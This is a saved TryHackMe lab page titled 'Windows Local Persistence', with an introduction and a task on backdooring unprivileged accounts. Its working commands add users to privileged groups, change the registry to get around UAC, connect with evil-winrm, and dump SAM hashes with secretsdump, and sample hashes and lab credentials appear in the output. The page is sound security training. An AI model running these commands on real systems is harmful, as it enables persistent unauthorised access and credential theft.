<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</div>
</div>
</nav>
<link rel="stylesheet" href="./TryHackMe _ Windows Local Persistence_files/streak-freeze.css">
<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">Ã—</span>
</button>
<div class="modal-body">
<figure>
<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Windows Local Persistence_files/streak-freeze.svg">
</figure>
<h2>You've unlocked a streak freeze!</h2>
<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Windows Local Persistence_files/streak-freeze.js"></script>
<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
<header>
<a href="https://tryhackme.com/" aria-label="Go to the home page">
<img width="140" src="./TryHackMe _ Windows Local Persistence_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
<i class="fal fa-times"></i>
</button>
</header>
<ul class="thm-mobile-nav-items mb-0">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="nav-title-icon far fa-browser"></i>
<div class="nav-title">Dashboard</div>
</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="nav-title-icon far fa-book-open"></i>
<div class="nav-title">Learn</div>
</a>
</li>
<li class="nav-item ">
<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-trophy"></i>
<div class="nav-title">Compete</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-compete" class="dropdown-wrapper">
<a href="https://tryhackme.com/leaderboards">
<div>
<i class="fas fa-trophy"></i>
</div>
<div>
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a href="https://tryhackme.com/games/koth">
<div>
<i class="fas fa-crown"></i>
</div>
<div>
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a href="https://tryhackme.com/workspace">
<div>
<i class="fas fa-user-friends"></i>
</div>
<div>
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item">
<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
<div class="nav-title">Other</div>
<i class="far fa-angle-down"></i>
</a>
<div id="mobile-nav-other" class="dropdown-wrapper">
<a href="https://tryhackme.com/resources">Resources</a>
<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a href="https://tryhackme.com/business">For Business</a>
<a href="https://tryhackme.com/classrooms">For Education</a>
<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
</div>
</li>
<li class="nav-item text-center">
<div class="nav-item-streak">
<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
 &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
</div>
</li>
<li class="nav-item text-center">
<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/windowslocalpersistence#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
<i id="mobile-notification-icon" class="fal fa-bell"></i>
<div id="mobile-notification-dot"></div>
</a>
<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="mobile-notification-header">Notifications</div>
<div id="mobile-nav-notifications">
<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
</div>
</div>
</li>
<li class="nav-item text-center">
<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
<img src="./TryHackMe _ Windows Local Persistence_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
</a>
<div id="mobile-nav-auth" class="dropdown-wrapper">
<a href="https://tryhackme.com/profile">Profile</a>
<a href="https://tryhackme.com/referrals">Refer a friend</a>
<a href="https://tryhackme.com/badges">Badges</a>
<a href="https://tryhackme.com/rooms">My Rooms</a>
<a href="https://tryhackme.com/access">Access</a>
<a href="https://tryhackme.com/feedback">Give Feedback</a>
<a href="https://tryhackme.com/logout">Logout</a>
</div>
</li>
</ul>
</nav>
<script defer="" src="./TryHackMe _ Windows Local Persistence_files/mobile-nav.js"></script>
<script>
  const userSignedUpLessThanSevenDaysAgo = Math.floor(
    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
  );

  const userHasFirst4RoomsBadge = !!``;
  const isBeginner = `advanced` === 'complete-beginner';
</script>
<script src="./TryHackMe _ Windows Local Persistence_files/notifications.js"></script>
<script src="./TryHackMe _ Windows Local Persistence_files/streak-freeze(1).js"></script>
<div id="wrapper">
<div id="room-banner" class="shadow-light">
<img id="room-image-large" src="./TryHackMe _ Windows Local Persistence_files/3de813de08870491b232d4fe5b4542f5.png">
<div>
<div id="room-details">
<div class="container">
<div class="page-header">
<div class="room-header">
<div id="room-voting" class="text-center vertical-align-custom">
<div class="voting-buttons">
<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
<div class="display-block" id="vote-number">451</div>
<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
</div>
</div>
<div id="room-logo" class="vertical-align-custom">
<div id="logo"><img class="room-avatar" src="./TryHackMe _ Windows Local Persistence_files/d566e150cc33c06b696981aeb0e1af59.png" onerror="replaceImg(this)"></div>
</div>
<div class="vertical-align-custom">
<div id="room-basic-data">
<div class="d-flex justify-content-between">
<h1 id="title" class="bold-head">Windows Local Persistence</h1>
<div id="room-title-options">

<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
<div class="btn-group" id="browser-machines" role="group">
<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/windowslocalpersistence#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
<span class="mb-0">Use Kali Linux</span>
<div class="text-lgray size-12">Web-based Kali Machine</div>
</a>
<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/windowslocalpersistence#" onclick="changeMyMachine(&quot;attackbox&quot;)">
<span class="mb-0">Use AttackBox</span>
<div class="text-lgray size-12">Recommended</div>
</a>
</div>
</div>
</div>
<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
Help
</span>
<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
<span class="badge badge-secondary" data-toggle="dropdown">
<i class="fas fa-cog"></i>
</span>
<div class="dropdown-menu">
<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/windowslocalpersistence" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
</div>
</div>
<span id="bookmark" class="badge badge-secondary badge-bookmark ">
<img class="bookmark" src="./TryHackMe _ Windows Local Persistence_files/bookmark.svg">
<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
" data-original-title="" title="">
</span>
</span>
</div>
</div>
<p class="mb0 faded" id="description">Learn the most common persistence techniques used on Windows machines.</p>
</div>
</div>
</div>
</div>

</div>
</div>
<div id="room-banner-stats">
<div class="creators"></div>
<div class="numbers"></div>
</div>
</div>
</div>
<div class="container main pb">
<div id="room-message"></div>
<section id="sponsor">
<i id="sponsor-close" class="fas fa-times"></i>
<div id="sponsor-data"></div>
</section>
<div id="top-panel">
<ul class="nav nav-tabs" id="task-navs">
<li class="nav-item">
<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/windowslocalpersistence#chart">
<i class="fas fa-chart-line icon-right"></i> Chart
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/windowslocalpersistence#scoreboard">
<i class="fas fa-trophy icon-right"></i> Scoreboard
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/windowslocalpersistence#chat">
<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/windowslocalpersistence#writeups">
<i class="fas fa-pen-alt icon-right"></i> Writeups
</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/windowslocalpersistence#about">
<i class="fas fa-info-circle icon-right"></i> More
</a>
</li>
</ul>
<div class="card cd-2 nav-above-con" id="room-main">
<div class="card-body">
<span id="room-tabs">
<div class="tab-content">
<div id="chart" class="tab-pane  active ">
<span id="difficulty-bar">
    <span class="room-difficulty diff-text">
      Difficulty: 
        <span class="difficulty-medium">Medium</span>
    </span></span>
<br><div id="chart-data"></div>
</div>
<div id="scoreboard" class="tab-pane fade">
<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
<thead>
<tr id="scoreboard_header">
<th>Rank</th>
<th>Username</th>
<th>Total Score</th>
</tr>
</thead>
<tbody id="scoreboard_body"></tbody>
</table>
</div>
<div id="chat" class="tab-pane fade">

<div class="row">
<div class="col-sm-6 text-center">
<h3 class="mb-2">Discord</h3>
<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
</div>
<div class="col-sm-6 text-center">
<h3 class="mb-2">Forum</h3>
<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/62d6c6f07fd7b47d81b08e75">post</a></div>
</div>
</div>
</div>
<div id="writeups" class="tab-pane text-center">
<div id="writeups-data">There are no writeups submitted.</div>
<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
<div id="writeup-form">
<div class="form-row">
<div class="col-auto">
 <input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
</div>
<div class="col-auto">
<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
</div>
<div class="col-auto">
<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
</div>
</div>
<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
</div>
</div>
<div id="about" class="tab-pane text-center">
<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 10183 users are in here and this room is 363 days old.</p></p>
<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Windows Local Persistence_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Windows Local Persistence_files/6be6191826f2a6e5a154c13ad8f29d1e.png"> 
        <a class="green-link" href="https://tryhackme.com/p/munra">munra</a></p></p>
</div>
</div>
</span>
</div>
</div>
</div>
<div id="room-simple-video" class="card card-body cd-2"></div>
<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
<div class="card-header card-header-red">Active Machine Information</div>
<div class="card-body">
<div class="row vertical-align-custom">
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3" id="table-machine-ip">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
<div class="col-sm-3">
<i>Loading...</i>
</div>
</div>
</div>
</div>
<div id="task-list">
<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-success" role="progressbar" style="width: 100%; aria-valuemin=" 0"="" aria-valuemax="100"> 100%</div></div></span></div>
<div id="taskContent"><div class="card" id="task-1">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse1" class="collapse show" data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <div style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/1a73b2609190f98fe926361dfe61b910.png" style="width:50%" alt="Room Icon"><br></div><p>After gaining the first foothold on your target's internal network, you'll want to ensure you don't lose access to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.</p>

<img src="./TryHackMe _ Windows Local Persistence_files/54fc4f7dd3d53953f9d5dbfb932b9d26.png" style="width:420px;float:right" class="note-float-right" alt="Backdoored Phone">

<p>There are many reasons why you'd want to establish persistence as quick as possible, including:</p>
<ul>
<li><strong>Re-exploitation isn't always possible</strong>: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.</li>
<li><strong>Gaining a foothold is hard to reproduce</strong>: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.</li>
<li><strong>The blue team is after you</strong>: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!</li>
</ul>
<p>While you could do with keeping some administrator's password hash and reusing it to connect back, you always risk those credentials getting rotated at some point. Plus, there are sneakier ways in which you could regain access to a compromised machine, making life harder for the blue team.</p>
<p>In this room, we'll look at the most common techniques attackers use to establish persistence in Windows systems. Before going into this room, it is recommended to be familiar with Windows systems fundamentals. You can check rooms on the matter in the following links:</p>
<ul>
<li><a href="https://tryhackme.com/room/windowsfundamentals1xbx">Windows Fundamentals 1</a></li>
<li><a href="https://tryhackme.com/room/windowsfundamentals2x0x">Windows Fundamentals 2</a></li></ul><p>Powershell is also used extensively throughout this room. You can learn more about it in the&nbsp;<a href="https://tryhackme.com/room/powershell" target="_blank">Hacking with Powershell</a>&nbsp;room.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Click and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="1">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-2">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Tampering With Unprivileged Accounts
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
                        </a>
                    </div>
                    <div id="collapse2" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
            <button type="button" class="btn btn-success" value="62cc3b646f5fa90052ea0ed7" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
        </div> <p>Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.</p>
<p>Click the <b>Start Machine</b><span> button on this task before continuing. The machine will be available on your web browser, but if you prefer connecting via <a class="Y3zws9bF glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;Y3zws9bF&#39;)">RDP</a>, you can use the following credentials:</span></p>

<div style="display:flex;justify-content:center">
	<div style="width:450px;display:flex;align-items:center;background-color:#e6e6e6;border-radius:8px;box-shadow:5px 5px 5px;padding:20px;margin-bottom:15px">
		<img src="./TryHackMe _ Windows Local Persistence_files/94fe3c0f556877a2721ca9e0744ad026.png" alt="THM key" style="max-height:120px">
		<span style="text-align:left;padding-left:20px;font-size:20px;width:100%">
		<table style="width:100%;border-spacing:4px;border-collapse:separate">
			<tbody><tr><td style="width:110px"><b>Username </b></td><td style="background-color:white;border-radius:5px;padding:4px">Administrator</td></tr>
			<tr><td><b>Password </b></td><td style="background-color:white;border-radius:5px;padding:4px">Password321</td></tr>
		</tbody></table>
		</span>
	</div>
</div>

<p><b>Note:</b><span> When you log in via <a class="HI7TWN02 glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;HI7TWN02&#39;)">RDP</a>, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing </span><b>Reconnect</b>.<br></p><p>Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.</p>
<p><span style="font-size:24px">Assign Group Memberships</span></p>
<p>For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.</p>
<p>The direct way to make an unprivileged user gain administrative privileges is to make it part of the <strong>Administrators</strong> group. We can easily achieve this with the following command:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; net localgroup administrators thmuser0 /add</span></code>
        </pre>
    </div>
</div>
<p><span>This will allow you to access the server by using <a class="nS1iPoiy glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;nS1iPoiy&#39;)">RDP</a>, WinRM or any other remote administration service available.</span></p>
<p>If this looks too suspicious, you can use the <strong>Backup Operators</strong><span> group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured <a class="RlphEe52 glossary-term" onclick="initPopOver(&#39;DACL&#39;, &#39;RlphEe52&#39;)">DACL</a>. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.</span></p>
<p>To do so, we begin by adding the account to the Backup Operators group:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; net localgroup "Backup Operators" thmuser1 /add</span></code>
        </pre>
    </div>
</div>
<p><span>Since this is an unprivileged account, it cannot <a class="qlgJhKu1 glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;qlgJhKu1&#39;)">RDP</a> or WinRM back to the machine unless we add it to the </span><strong>Remote Desktop Users</strong><span> (<a class="yXSnNdJl glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;yXSnNdJl&#39;)">RDP</a>) or </span><strong>Remote Management Users</strong> (WinRM) groups. We'll use WinRM for this task:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; net localgroup "Remote Management Users" thmuser1 /add</span></code>
        </pre>
    </div>
</div>
<p>We'll assume we have already dumped the credentials on the server and have thmuser1's password. Let's connect via WinRM using its credentials:</p>

<div style="display:flex;justify-content:center">
	<div style="width:450px;display:flex;align-items:center;background-color:#e6e6e6;border-radius:8px;box-shadow:5px 5px 5px;padding:20px;margin-bottom:15px">
		<img src="./TryHackMe _ Windows Local Persistence_files/94fe3c0f556877a2721ca9e0744ad026.png" alt="THM key" style="max-height:120px">
		<span style="text-align:left;padding-left:20px;font-size:20px;width:100%">
		<table style="width:100%;border-spacing:4px;border-collapse:separate">
			<tbody><tr><td style="width:110px"><b>Username </b></td><td style="background-color:white;border-radius:5px;padding:4px">thmuser1</td></tr>
			<tr><td><b>Password </b></td><td style="background-color:white;border-radius:5px;padding:4px">Password321</td></tr>
		</tbody></table>
		</span>
	</div>
</div>

<p>If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">evil-winrm -i MACHINE_IP -u thmuser1 -p Password321</span></span>

<span class="token output">*Evil-WinRM* PS C:\&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192</span></code>
        </pre>
    </div>
</div>
<p><span>This is due to User Account Control (<a class="OZX0NoAv glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;OZX0NoAv&#39;)">UAC</a>). One of the features implemented by UAC,&nbsp;</span><strong>LocalAccountTokenFilterPolicy</strong><span>, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through <a class="qz8QwxDE glossary-term" onclick="initPopOver(&#39;UAC&#39;, &#39;qz8QwxDE&#39;)">UAC</a> from a graphical user session (Read more on UAC </span><a href="https://tryhackme.com/room/windowsfundamentals1xbx">here</a>), if you are using WinRM, you are confined to a limited access token with no administrative privileges.</p>
<p>To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1</span></code>
        </pre>
    </div>
</div>
<p>Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">evil-winrm -i MACHINE_IP -u thmuser1 -p Password321</span></span>
<span class="token output">        
*Evil-WinRM* PS C:\&gt; whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
</span></code>
        </pre>
    </div>
</div>
<p>We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">*Evil-WinRM* PS C:\&gt; reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\&gt; reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\&gt; download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\&gt; download sam.bak
    Info: Download successful!</span></code>
        </pre>
    </div>
</div>
<p><strong>Note:</strong> If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.</p>
<p>With those files, we can dump the password hashes for all users using <code>secretsdump.py</code> or other similar tools:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL</span></span>

<span class="token output">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...</span></code>
        </pre>
    </div>
</div>
